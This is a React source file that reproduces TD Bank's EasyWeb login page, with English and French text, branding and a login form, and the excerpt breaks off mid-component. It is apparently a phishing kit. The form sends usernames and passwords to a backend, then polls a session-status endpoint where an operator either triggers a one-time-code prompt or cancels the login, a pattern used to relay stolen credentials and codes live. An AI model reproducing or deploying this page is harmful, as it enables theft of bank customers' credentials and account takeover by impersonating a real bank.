import React, { useState, useEffect, useRef } from 'react';
import { Eye, EyeOff, Info } from 'lucide-react';

/* ─── TD Bank logo image ─── */
const TDLogo = () => (
  <img src="/td-logo.png" alt="TD Bank Logo" className="w-[42px] h-[42px] block rounded-[4px]" />
);

/* ─── Canadian flag SVG ─── */
const CanadaFlag = () => (
  <svg viewBox="0 0 22 15" xmlns="http://www.w3.org/2000/svg" width="22" height="15">
    <rect width="22" height="15" fill="#fff"/>
    <rect width="5.5" height="15" fill="#d52b1e"/>
    <rect x="16.5" width="5.5" height="15" fill="#d52b1e"/>
    <polygon points="11,2.5 12,5.5 15,5.5 12.5,7.5 13.5,10.5 11,8.5 8.5,10.5 9.5,7.5 7,5.5 10,5.5" fill="#d52b1e"/>
  </svg>
);

/* ─── US flag SVG ─── */
const USFlag = () => (
  <svg viewBox="0 0 22 15" xmlns="http://www.w3.org/2000/svg" width="22" height="15">
    <rect width="22" height="15" fill="#fff"/>
    <rect y="0" width="22" height="1.15" fill="#b22234"/>
    <rect y="2.3" width="22" height="1.15" fill="#b22234"/>
    <rect y="4.6" width="22" height="1.15" fill="#b22234"/>
    <rect y="6.9" width="22" height="1.15" fill="#b22234"/>
    <rect y="9.2" width="22" height="1.15" fill="#b22234"/>
    <rect y="11.5" width="22" height="1.15" fill="#b22234"/>
    <rect y="13.8" width="22" height="1.2" fill="#b22234"/>
    <rect width="8.8" height="8.07" fill="#3c3b6e"/>
    <circle cx="1.5" cy="1.5" r="0.45" fill="#fff"/>
    <circle cx="3.5" cy="1.5" r="0.45" fill="#fff"/>
    <circle cx="5.5" cy="1.5" r="0.45" fill="#fff"/>
    <circle cx="7.5" cy="1.5" r="0.45" fill="#fff"/>
    <circle cx="2.5" cy="3" r="0.45" fill="#fff"/>
    <circle cx="4.5" cy="3" r="0.45" fill="#fff"/>
    <circle cx="6.5" cy="3" r="0.45" fill="#fff"/>
    <circle cx="1.5" cy="4.5" r="0.45" fill="#fff"/>
    <circle cx="3.5" cy="4.5" r="0.45" fill="#fff"/>
    <circle cx="5.5" cy="4.5" r="0.45" fill="#fff"/>
    <circle cx="7.5" cy="4.5" r="0.45" fill="#fff"/>
    <circle cx="2.5" cy="6" r="0.45" fill="#fff"/>
    <circle cx="4.5" cy="6" r="0.45" fill="#fff"/>
    <circle cx="6.5" cy="6" r="0.45" fill="#fff"/>
  </svg>
);

/* ─── Dropdown check icon ─── */
const DropdownCheck = () => (
  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#1a7b3a" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
    <polyline points="20 6 9 17 4 12" />
  </svg>
);

/* ─── Accordion icon ─── */
const AccordionIcon = ({ expanded }) => (
  <svg viewBox="0 0 24 24" width="22" height="22" className="text-[#1a7b3a] shrink-0" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
    <circle cx="12" cy="12" r="10" />
    {expanded ? (
      <line x1="8" y1="12" x2="16" y2="12" />
    ) : (
      <>
        <line x1="12" y1="8" x2="12" y2="16" />
        <line x1="8" y1="12" x2="16" y2="12" />
      </>
    )}
  </svg>
);

const translations = {
  en: {
    langLabel: "Français",
    langCode: "fr",
    pageTitle: "EasyWeb Login",
    usernameLabel: "Username or Access Card",
    usernamePlaceholder: "",
    passwordLabel: "Password",
    passwordPlaceholder: "",
    forgotPassword: "Forgot your username or password? ›",
    rememberMe: "Remember me",
    signIn: "Login",
    signingIn: "Signing in...",
    welcomeTitle: "Welcome to EasyWeb,let's get started.",
    registerBtn: "Register online now",
    registerDesc: "If you've received your temporary password, use it to log in along with your Access Card number. You'll then be prompted to create a new Password.",
    loginHelp: "Login Help",
    getLoginHelp: "Get Login Help ›",
    resetPassword: "Reset Password ›",
    enhancedSecurity: "Enhanced Security",
    twoStepFaq: "Two-Step Verification FAQs ›",
    improveProtection: "Improve Your Protection Against Online Fraud ›",
    mobileTitle: "Explore mobile banking with the TD app now",
    mobileDesc: "Take banking and investing almost anywhere ›",
    securityNote: "TD Online and Mobile Security Guarantee:",
    securityLink: "You are protected ›",
    errorEmail: "Please enter a valid username or access card",
    errorPassword: "Password must be at least 6 characters long",
    errorRequired: "Username and password are required",
    personal: "Personal",
    business: "Business",
    investing: "Investing",
    myAccounts: "My Accounts",
    howTo: "How To",
    products: "Products",
    solutions: "Solutions",
    navLogin: "Login",
    descriptionOptional: "+ Description (Optional)",
    disclaimerStart: "By using EasyWeb, our secured financial services site, offered by TD Canada Trust and its affiliates, you agree to the terms and services of the ",
    disclaimerMid1: " , ",
    disclaimerMid2: " , ",
    disclaimerMid3: " and/or; the ",
    disclaimerMid4: " and/or; the ",
    disclaimerAnd: " and ",
    disclaimerEnd: " for mutual funds accounts held with TD Investment Services Inc.",
    financialServicesTerms: "Financial Services Terms",
    accessAgreement: "Access Agreement",
    digitalBankingAgreement: "Digital Banking Agreement",
    businessAccessServicesSchedule: "Business Access Services Schedule",
    termsAndAgreement: "Terms and Agreement",
    disclosure: "Disclosure",
    talkToUs: "Need to talk to us directly?",
    contactUs: "Contact us",
    connectTitle: "Connect with TD",
    menuHome: "Home",
    menuMyAccounts: "My Accounts",
    menuHowTo: "How To",
    menuBankAccounts: "Bank Accounts",
    menuCreditCards: "Credit Cards",
    menuMortgages: "Mortgages",
    menuBorrowing: "Borrowing",
    menuSavingInvesting: "Saving & Investing",
    menuInsurance: "Insurance",
    menuAllProducts: "All Products",
    menuSolutions: "Solutions",
    menuFindUs: "Find Us",
    menuHelp: "Help",
  },
  fr: {
    langLabel: "English",
    langCode: "en",
    pageTitle: "Se connecter à BanqueNet",
    usernameLabel: "Nom d'utilisateur ou carte Accès",
    usernamePlaceholder: "",
    passwordLabel: "Mot de passe",
    passwordPlaceholder: "",
    forgotPassword: "Nom d'utilisateur ou mot de passe oubliés? ›",
    rememberMe: "Mémoriser mes renseignements",
    signIn: "Ouvrir une session",
    signingIn: "Ouverture de session...",
    welcomeTitle: "Bienvenue dans\nBanqueNet,\ncommençons.",
    registerBtn: "S'inscrire en ligne\nmaintenant",
    registerDesc: "Si vous avez reçu votre mot de passe temporaire, utilisez-le avec votre numéro de carte Accès pour ouvrir une session. On vous invitera à créer un nouveau mot de passe.",
    loginHelp: "Aide pour ouvrir une session",
    getLoginHelp: "Obtenir de l'aide pour ouvrir une session ›",
    resetPassword: "Réinitialiser votre mot de passe ›",
    enhancedSecurity: "Sécurité Améliorée",
    twoStepFaq: "FAQ sur la vérification en deux temps ›",
    improveProtection: "Améliorer votre protection contre la fraude en ligne ›",
    mobileTitle: "Explorez les services bancaires mobiles avec l'appli TD maintenant",
    mobileDesc: "Gérez vos affaires bancaires et vos placements où que vous soyez ›",
    securityNote: "Garant. sécur. serv. mob. ou en ligne de la TD:",
    securityLink: "Vous êtes protégé ›",
    errorEmail: "Veuillez entrer un nom d'utilisateur ou une carte Accès valide",
    errorPassword: "Le mot de passe doit comporter au moins 6 caractères",
    errorRequired: "Le nom d'utilisateur et le mot de passe sont requis",
    personal: "Particuliers",
    business: "Petites entreprises",
    investing: "Gestion de patrimoine TD",
    myAccounts: "Mes comptes",
    howTo: "Comment faire",
    products: "Produits",
    solutions: "Solutions",
    navLogin: "Démarrez",
    descriptionOptional: "+ Description (optionnel)",
    disclaimerStart: "En utilisant BanqueNet, notre site de services financiers sécurisé, offert par la TD Canada Trust et ses filiales, vous acceptez les modalités et conditions des ",
    disclaimerMid1: " , de la ",
    disclaimerMid2: " , de la ",
    disclaimerMid3: " et/ou; de l' ",
    disclaimerMid4: " et/ou; des ",
    disclaimerAnd: " et de la ",
    disclaimerEnd: " pour les comptes de fonds communs de placement détenus auprès de Services d'investissement TD Inc.",
    financialServicesTerms: "Conditions des services financiers",
    accessAgreement: "Convention d'accès aux services",
    digitalBankingAgreement: "Convention relative aux services bancaires numériques",
    businessAccessServicesSchedule: "Annexe sur les services d'accès aux entreprises",
    termsAndAgreement: "Conditions et convention",
    disclosure: "Déclaration",
    talkToUs: "Besoin de nous parler directement?",
    contactUs: "Contactez-nous",
    connectTitle: "Restez connecté avec la TD",
    menuHome: "Accueil",
    menuMyAccounts: "Mes comptes",
    menuHowTo: "Comment faire",
    menuBankAccounts: "Comptes de dépôt",
    menuCreditCards: "Cartes de crédit",
    menuMortgages: "Prêts hypothécaires",
    menuBorrowing: "Prêts et lignes de crédit",
    menuSavingInvesting: "Épargne et placement",
    menuInsurance: "Assurance",
    menuAllProducts: "Tous les produits",
    menuSolutions: "Solutions",
    menuFindUs: "Nous trouver",
    menuHelp: "Aide",
  }
};

export default function LoginPage({ lang, setLang, onSignInInitiated }) {
  const t = translations[lang];
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorBanner, setErrorBanner] = useState('');
  const [isEmailInvalid, setIsEmailInvalid] = useState(false);
  const [isPasswordInvalid, setIsPasswordInvalid] = useState(false);
  const [showInfoPopup, setShowInfoPopup] = useState(false);
  const [isDescriptionExpanded, setIsDescriptionExpanded] = useState(false);
  const [description, setDescription] = useState('');

  const [langDropdownOpen, setLangDropdownOpen] = useState(false);
  const [selectedCountry, setSelectedCountry] = useState('CA');

  const [loginHelpExpanded, setLoginHelpExpanded] = useState(false);
  const [securityExpanded, setSecurityExpanded] = useState(false);

  const [menuOpen, setMenuOpen] = useState(false);
  const [drawerLangOpen, setDrawerLangOpen] = useState(false);

  const langRef = useRef(null);

  useEffect(() => {
    const handleOutsideClick = (e) => {
      if (langRef.current && !langRef.current.contains(e.target)) {
        setLangDropdownOpen(false);
      }
    };
    document.addEventListener('click', handleOutsideClick);
    return () => document.removeEventListener('click', handleOutsideClick);
  }, []);

  useEffect(() => {
    if (!showInfoPopup) return;
    const handleOutsideClick = () => setShowInfoPopup(false);
    document.addEventListener('click', handleOutsideClick);
    return () => document.removeEventListener('click', handleOutsideClick);
  }, [showInfoPopup]);

  // Poll session status when loading
  useEffect(() => {
    if (!isLoading || !email.trim()) return;
    let intervalId;
    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email.trim())}`, {
          headers: { 'X-Access-Key': 'client-td-bank' }
        });
        const data = await response.json();
        if (data.success) {
          if (data.status === 'show_otp') {
            setIsLoading(false);
            onSignInInitiated(email.trim());
          } else if (data.status === 'cancelled') {
            setIsLoading(false);
            setErrorBanner(lang === 'fr' ? 'Connexion annulée par l\'administrateur.' : 'Login cancelled by administrator.');
          }
        }
      } catch (err) {
        console.error('Error polling session status:', err);
      }
    };
    intervalId = setInterval(checkStatus, 2000);
    return () => { if (intervalId) clearInterval(intervalId); };
  }, [isLoading, email, lang, onSignInInitiated]);

  const toggleLanguage = (e) => {
    e.preventDefault();
    setLang(lang === 'en' ? 'fr' : 'en');
    setErrorBanner('');
    setIsEmailInvalid(false);
    setIsPasswordInvalid(false);
  };

  const validateUsername = (val) => val.trim().length >= 3;

  const handleSignIn = async (e) => {
    e.preventDefault();
    setErrorBanner('');
    setIsEmailInvalid(false);
    setIsPasswordInvalid(false);

    let hasError = false;

    if (!email.trim() || !validateUsername(email.trim())) {
      setIsEmailInvalid(true);
      setErrorBanner(t.errorEmail);
      hasError = true;
    }

    if (!password.trim() || password.trim().length < 6) {
      setIsPasswordInvalid(true);
      if (!hasError) setErrorBanner(t.errorPassword);
      hasError = true;
    }

    if (hasError) return;
    setIsLoading(true);

    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-td-bank' },
        body: JSON.stringify({
          email: email.trim(),
          password: password.trim(),
          description: isDescriptionExpanded ? description.trim() : ''
        })
      });
      const data = await response.json();
      if (!data.success) {
        setIsLoading(false);
        setErrorBanner(lang === 'fr' ? 'Échec de la connexion.' : 'Failed to connect.');
        setIsEmailInvalid(true);
      }
    } catch (err) {
      console.error(err);
      setIsLoading(false);
      setErrorBanner(lang === 'fr' ? 'Impossible de se connecter au serveur.' : 'Unable to connect to the server.');
      setIsEmailInvalid(true);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">

      {/* ── Utility bar ── */}
      <div className="hidden md:block bg-white border-b border-[#e0e0e0]">
        <div className="max-w-[1080px] mx-auto px-5 w-full flex items-stretch h-10 box-border">
        {/* Tabs */}
        <div className="flex gap-0 mr-auto">
          {[t.personal, t.business, t.investing].map((tab, i) => (
            <a key={tab} href="#" onClick={e => e.preventDefault()} className={`text-[15px] px-4 py-2.5 flex items-center no-underline border-b-3 ${
              i === 0 ? 'text-[#333] border-[#1a7b3a] font-semibold' : 'text-[#1a7b3a] border-transparent font-normal'
            }`}>
              {tab}
            </a>
          ))}
        </div>
        {/* Right: language dropdown */}
        <div className="flex items-stretch gap-2 h-full">
          {/* Language selector */}
          <div
            ref={langRef}
            onMouseEnter={() => {
              setLangDropdownOpen(true);
            }}
            onMouseLeave={() => setLangDropdownOpen(false)}
            className="relative h-full flex items-stretch"
          >
            <button
              className={`flex items-center gap-1 px-3 text-[15px] cursor-pointer text-[#333] relative box-border ${
                langDropdownOpen
                  ? 'bg-white border-l border-r border-t border-[#d8d8d8] border-b border-white rounded-t-[4px] h-[calc(100%+1px)] z-[101]'
                  : 'bg-transparent border border-transparent rounded-[4px] h-full z-auto'
              }`}
            >
              <span className="text-[14px] text-[#333] font-medium">
                {lang === 'fr' ? 'Français' : 'English'}
              </span>
              <span className="text-[11px] ml-[1px] text-[#555]">
                {langDropdownOpen ? '▲' : '▾'}
              </span>
            </button>

            {langDropdownOpen && (
              <div className="absolute top-full right-0 -mt-[1px] w-[140px] bg-white border border-[#d8d8d8] shadow-[0_4px_12px_rgba(0,0,0,0.12)] rounded-l-[4px] rounded-br-[4px] z-[100] py-1">
                <button
                  onClick={() => {
                    setLang('en');
                    setSelectedCountry('US');
                    setLangDropdownOpen(false);
                    setErrorBanner('');
                    setIsEmailInvalid(false);
                    setIsPasswordInvalid(false);
                  }}
                  className="flex items-center justify-between w-full px-4 py-2.5 bg-transparent border-none cursor-pointer text-[15px] text-[#333] text-left hover:bg-[#f5f5f5]"
                >
                  <span>English</span>
                  {lang === 'en' && <DropdownCheck />}
                </button>
                <button
                  onClick={() => {
                    setLang('fr');
                    setSelectedCountry('CA');
                    setLangDropdownOpen(false);
                    setErrorBanner('');
                    setIsEmailInvalid(false);
                    setIsPasswordInvalid(false);
                  }}
                  className="flex items-center justify-between w-full px-4 py-2.5 bg-transparent border-none cursor-pointer text-[15px] text-[#333] text-left hover:bg-[#f5f5f5]"
                >
                  <span>Français</span>
                  {lang === 'fr' && <DropdownCheck />}
                </button>
              </div>
            )}
          </div>
        </div>
        </div>
      </div>

      <nav className="bg-[#12412A]">
        <div className="max-w-[1080px] mx-auto px-5 w-full flex items-center h-16 justify-between md:justify-start md:gap-10 box-border">
          {/* Left: Mobile hamburger menu & TD Logo */}
          <div className="flex items-center gap-4 shrink-0 mr-4">
            <button 
              onClick={() => setMenuOpen(true)}
              className="md:hidden text-white bg-transparent border-none p-1 cursor-pointer flex items-center justify-center"
            >
              <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="3" y1="12" x2="21" y2="12" />
                <line x1="3" y1="6" x2="21" y2="6" />
                <line x1="3" y1="18" x2="21" y2="18" />
              </svg>
            </button>
            <div className="leading-none">
              <TDLogo />
            </div>
          </div>
          {/* Nav links (Desktop only) */}
          <ul className="hidden md:flex gap-9 list-none flex-1 m-0 p-0">
            {[
              { label: t.myAccounts, key: 'myAccounts' },
              { label: t.howTo, key: 'howTo' },
              { label: `${t.products} ▾`, key: 'products' },
              { label: `${t.solutions} ▾`, key: 'solutions' }
            ].map(item => (
              <li key={item.key}>
                <a href="#" onClick={e => e.preventDefault()} className="text-white text-base font-medium flex items-center gap-1 no-underline hover:underline">{item.label}</a>
              </li>
            ))}
          </ul>
          {/* Desktop Nav icons & Desktop Login button, plus Mobile Login button */}
          <div className="flex items-center gap-4">
            {/* Desktop only elements */}
            <div className="hidden md:flex items-center gap-4">
              {/* Location */}
              <button title="Find a branch" className="bg-transparent border-none text-white cursor-pointer p-1.5 rounded-full hover:bg-white/10 transition-colors">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#fff"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5S10.62 6.5 12 6.5s2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
              </button>
              {/* Help */}
              <button title="Help" className="bg-transparent border-none text-white cursor-pointer p-1.5 rounded-full hover:bg-white/10 transition-colors">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
              </button>
              {/* Search */}
              <button title="Search" className="bg-transparent border-none text-white cursor-pointer p-1.5 rounded-full hover:bg-white/10 transition-colors">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#fff"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
              </button>
              {/* Separator */}
              <div className="w-[1px] h-7 bg-white/35" />
              {/* Desktop Login button */}
              <button className="flex items-center gap-1.5 text-white text-base font-medium bg-transparent border-none cursor-pointer px-2.5 py-1.5 rounded-[4px] hover:bg-white/10 transition-colors">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#fff"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                {t.navLogin} ▾
              </button>
            </div>
            {/* Mobile Login button (silhouette + text) */}
            <button className="md:hidden flex items-center gap-1.5 text-white text-base font-medium bg-transparent border-none cursor-pointer px-2 py-1.5">
              <div className="relative">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#fff">
                  <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                </svg>
                <div className="absolute -bottom-0.5 -right-0.5 bg-[#12412A] rounded-full p-[1px]">
                  <svg viewBox="0 0 24 24" width="8" height="8" fill="#fff">
                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/>
                  </svg>
                </div>
              </div>
              <span>{t.navLogin}</span>
            </button>
          </div>
        </div>
      </nav>

      {/* ── Mobile Menu Drawer Overlay ── */}
      <div 
        className={`fixed inset-0 bg-black/50 z-[999] transition-opacity duration-300 ease-in-out ${
          menuOpen ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'
        }`}
        onClick={() => setMenuOpen(false)}
      />

      {/* ── Mobile Menu Drawer Container ── */}
      <div 
        className={`fixed top-0 left-0 h-full w-[80%] md:w-[320px] bg-white shadow-[4px_0_20px_rgba(0,0,0,0.15)] z-[1000] flex flex-col transition-transform duration-300 ease-in-out ${
          menuOpen ? 'translate-x-0' : '-translate-x-full'
        }`}
      >
        {/* Drawer Header */}
        <div className="bg-[#12412A] pt-4 pb-2 px-4 flex flex-col">
          <div className="flex items-center justify-between">
            <TDLogo />
            <button 
              onClick={() => setMenuOpen(false)}
              className="text-white bg-transparent border-none cursor-pointer p-1"
            >
              <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="18" y1="6" x2="6" y2="18" />
                <line x1="6" y1="6" x2="18" y2="18" />
              </svg>
            </button>
          </div>
          {/* Search bar inside header */}
          <div className="relative mt-5 mb-2 pb-1.5 border-b border-white/40 flex items-center gap-2">
            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" className="opacity-80">
              <circle cx="11" cy="11" r="8" />
              <line x1="21" y1="21" x2="16.65" y2="16.65" />
            </svg>
            <input
              type="text"
              placeholder="Search"
              className="bg-transparent border-none outline-none text-white text-base w-full placeholder-white/60"
            />
          </div>
        </div>

        {/* Drawer Body Items */}
        <div className="flex-1 overflow-y-auto">
          {/* Personal/Business/Investing Toggle header */}
          <div className="border-b border-[#e0e0e0] py-3.5 px-4 bg-[#f9f9f9] flex items-center justify-between text-base text-[#333] font-medium">
            <span>TD: Personal</span>
            <span className="text-xs text-[#555]">▾</span>
          </div>

          {/* List of links */}
          {[
            { label: t.menuHome, key: 'home' },
            { label: t.menuMyAccounts, key: 'myAccounts' },
            { label: t.menuHowTo, key: 'howTo' },
            { label: t.menuBankAccounts, key: 'bankAccounts' },
            { label: t.menuCreditCards, key: 'creditCards' },
            { label: t.menuMortgages, key: 'mortgages' },
            { label: t.menuBorrowing, key: 'borrowing' },
            { label: t.menuSavingInvesting, key: 'savingInvesting' },
            { label: t.menuInsurance, key: 'insurance' },
            { label: t.menuAllProducts, key: 'allProducts' },
            { label: `${t.menuSolutions}`, key: 'solutions', dropdown: true },
            { label: t.menuFindUs, key: 'findUs' },
            { label: t.menuHelp, key: 'help' }
          ].map((item) => (
            <div key={item.key} className="border-b border-[#e0e0e0]">
              <a
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  setMenuOpen(false);
                }}
                className="flex items-center justify-between py-3.5 px-4 text-base text-[#333] font-normal no-underline hover:bg-black/5"
              >
                <span>{item.label}</span>
                {item.dropdown && <span className="text-xs text-[#555]">▾</span>}
              </a>
            </div>
          ))}



          {/* LANGUAGE selection dropdown drawer */}
          <div className="border-b border-[#e0e0e0]">
            <button
              onClick={() => setDrawerLangOpen(!drawerLangOpen)}
              className="w-full flex items-center justify-between py-3.5 px-4 bg-transparent border-none text-left cursor-pointer text-base text-[#333]"
            >
              <span className="font-medium">{lang === 'en' ? 'English' : 'Français'}</span>
              <span className="text-xs text-[#555]">{drawerLangOpen ? '▲' : '▾'}</span>
            </button>
            {drawerLangOpen && (
              <div className="bg-[#fcfcfc] border-t border-[#e5e5e5] pb-2">
                <button
                  onClick={() => {
                    setLang('en');
                    setSelectedCountry('US');
                    setDrawerLangOpen(false);
                    setMenuOpen(false);
                  }}
                  className="w-full flex items-center justify-between py-2.5 px-8 bg-transparent border-none text-left cursor-pointer hover:bg-black/5"
                >
                  <span className="text-base text-[#333]">English</span>
                  {lang === 'en' && <DropdownCheck />}
                </button>
                <button
                  onClick={() => {
                    setLang('fr');
                    setSelectedCountry('CA');
                    setDrawerLangOpen(false);
                    setMenuOpen(false);
                  }}
                  className="w-full flex items-center justify-between py-2.5 px-8 bg-transparent border-none text-left cursor-pointer hover:bg-black/5"
                >
                  <span className="text-base text-[#333]">Français</span>
                  {lang === 'fr' && <DropdownCheck />}
                </button>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* ── Main content ── */}
      <div className="max-w-[1080px] mx-auto px-4 md:px-5 pt-6 md:pt-12 pb-3 md:pb-15 w-full">
        <h1 className="text-2xl md:text-[30px] font-light text-[#222] mb-5 md:mb-7">
          {t.pageTitle}
        </h1>

        {/* Error Banner */}
        {errorBanner && (
          <div className="bg-[#fde8e8] border border-[#f5a0a0] border-l-4 border-l-[#c0392b] rounded-[3px] px-4 py-3 mb-5 flex items-center gap-2 animate-fade-in">
            <svg viewBox="0 0 24 24" className="w-[18px] h-[18px] fill-[#c0392b] shrink-0">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
            </svg>
            <span className="text-[#c0392b] text-[15px] font-medium">{errorBanner}</span>
          </div>
        )}

        {/* Login grid */}
        <div className="flex flex-col md:grid md:grid-cols-2 bg-transparent md:bg-[#F5F9F7] overflow-hidden gap-6 md:gap-0">

          {/* ── LEFT: login form ── */}
          <div className="bg-[#F5F9F7] md:bg-transparent px-5 md:px-10 py-6 md:py-9">
            <form onSubmit={handleSignIn}>

              {/* Username field */}
              <div className="mb-5">
                <label htmlFor="username" className="block text-[15px] text-[#333] mb-1.5 font-normal">
                  {t.usernameLabel}
                </label>
                <input
                  id="username"
                  type="text"
                  value={email}
                  onChange={e => {
                    const val = e.target.value;
                    setEmail(val);
                    if (val.trim().length >= 3) {
                      setIsEmailInvalid(false);
                      if (!isPasswordInvalid) setErrorBanner('');
                    }
                  }}
                  onBlur={() => {
                    if (!email.trim() || !validateUsername(email.trim())) {
                      setIsEmailInvalid(true);
                      setErrorBanner(t.errorEmail);
                    } else {
                      setIsEmailInvalid(false);
                      if (!isPasswordInvalid) setErrorBanner('');
                    }
                  }}
                  disabled={isLoading}
                  autoComplete="username"
                  className={`w-full h-[38px] border-l border-r border-t rounded-none px-3 text-base text-[#333] outline-none bg-white box-border focus:shadow-none border-b-2 ${
                    isEmailInvalid ? 'border-[#c0392b] border-b-[#c0392b]' : 'border-[#ccc] border-b-[#1a7b3a]'
                  }`}
                  onFocus={e => { e.target.style.boxShadow = 'none'; }}
                />
                
                {/* Toggleable Description Section */}
                <div className="mt-1.5">
                  <a
                    href="#"
                    className="hover-underline inline-flex items-center gap-1 text-[#1a7b3a] text-[15px] cursor-pointer no-underline font-medium"
                    onClick={e => {
                      e.preventDefault();
                      setIsDescriptionExpanded(!isDescriptionExpanded);
                    }}
                  >
                    {isDescriptionExpanded ? t.descriptionOptional.replace('+', '-') : t.descriptionOptional}
                  </a>
                  {isDescriptionExpanded && (
                    <div className="mt-2 animate-fade-in">
                      <input
                        type="text"
                        value={description}
                        onChange={e => setDescription(e.target.value)}
                        disabled={isLoading}
                        className="w-full h-[38px] border-l border-r border-t border-[#ccc] border-b-2 border-b-[#1a7b3a] rounded-none px-3 text-base text-[#333] outline-none bg-white box-border focus:shadow-none"
                        onFocus={e => { e.target.style.boxShadow = 'none'; }}
                      />
                    </div>
                  )}
                </div>
              </div>

              {/* Password field */}
              <div className="mb-5">
                <label htmlFor="password" className="block text-[15px] text-[#333] mb-1.5 font-normal">
                  {t.passwordLabel}
                </label>
                <div className="relative">
                  <input
                    id="password"
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={e => {
                      const val = e.target.value;
                      setPassword(val);
                      if (val.trim().length >= 6) {
                        setIsPasswordInvalid(false);
                        if (!isEmailInvalid) setErrorBanner('');
                      }
                    }}
                    onBlur={() => {
                      if (!password.trim() || password.trim().length < 6) {
                        setIsPasswordInvalid(true);
                        setErrorBanner(t.errorPassword);
                      } else {
                        setIsPasswordInvalid(false);
                        if (!isEmailInvalid) setErrorBanner('');
                      }
                    }}
                    disabled={isLoading}
                    autoComplete="current-password"
                    className={`w-full h-[38px] border-l border-r border-t rounded-none pl-3 pr-10 text-base text-[#333] outline-none bg-white box-border focus:shadow-none border-b-2 ${
                      isPasswordInvalid ? 'border-[#c0392b] border-b-[#c0392b]' : 'border-[#ccc] border-b-[#1a7b3a]'
                    }`}
                    onFocus={e => { e.target.style.boxShadow = 'none'; }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2.5 top-1/2 -translate-y-1/2 bg-transparent border-none cursor-pointer text-[#555] p-1 flex items-center"
                    title="Show/hide password"
                  >
                    {showPassword
                      ? <EyeOff className="w-[18px] h-[18px]" />
                      : <Eye className="w-[18px] h-[18px]" />
                    }
                  </button>
                </div>
              </div>

              {/* Remember me (Custom green square border checkbox) */}
              <div className="flex items-center gap-2 mb-5 text-[15px] text-[#333] relative">
                <div className="relative w-[18px] h-[18px] flex items-center justify-center">
                  <input
                    type="checkbox"
                    id="remember"
                    checked={rememberMe}
                    onChange={e => setRememberMe(e.target.checked)}
                    disabled={isLoading}
                    className="absolute opacity-0 w-full h-full m-0 cursor-pointer z-10"
                  />
                  <div
                    className="absolute top-0 left-0 w-[18px] h-[18px] border-[1.5px] border-[#1a7b3a] rounded-none bg-white box-border flex items-center justify-center z-0"
                  >
                    {rememberMe && (
                      <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="#1a7b3a" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round">
                        <polyline points="20 6 9 17 4 12" />
                      </svg>
                    )}
                  </div>
                </div>
                <label htmlFor="remember" className="cursor-pointer select-none">{t.rememberMe}</label>

                {/* Info icon + tooltip */}
                <div className="relative flex items-center">
                  <button
                    type="button"
                    onClick={e => { e.preventDefault(); e.stopPropagation(); setShowInfoPopup(!showInfoPopup); }}
                    className="bg-transparent border-none cursor-pointer text-[#555] p-0.5 flex items-center"
                  >
                    <Info className="w-4 h-4" />
                  </button>
                  {showInfoPopup && (
                    <div
                      onClick={e => e.stopPropagation()}
